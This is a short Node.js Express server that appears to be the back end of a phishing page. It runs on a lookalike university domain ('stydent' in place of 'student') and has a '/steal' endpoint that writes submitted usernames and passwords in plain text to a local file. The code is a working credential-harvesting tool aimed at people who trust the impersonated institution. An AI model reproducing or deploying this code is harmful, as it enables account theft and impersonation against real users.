const https = require("https");
const fs = require("fs");
const host = "s.stydent.pwr.edu.pl";
const port = 443;
const bodyParser = require("body-parser");
const express = require("express");

const app = express();
const options = {
    key: fs.readFileSync("privkeyForSite.pem"),
    cert: fs.readFileSync("certForSite.crt")
};

app.use(bodyParser.urlencoded({extended: false}));
app.use(bodyParser.json());
app.use("/", express.static(__dirname + "/"));

app.post("/steal", (req, res) => {
	if (req.body.username && req.body.password)
	{
		fs.appendFileSync(__dirname + "/passwords", `login: ${req.body.username}, password: ${req.body.password}\n`);
		res.send(true);
	}
	else
	{
		res.send(false);
	}
});

https.createServer(options, app).listen(port, host)
console.log(`Server running on https://${host}:${port}`)
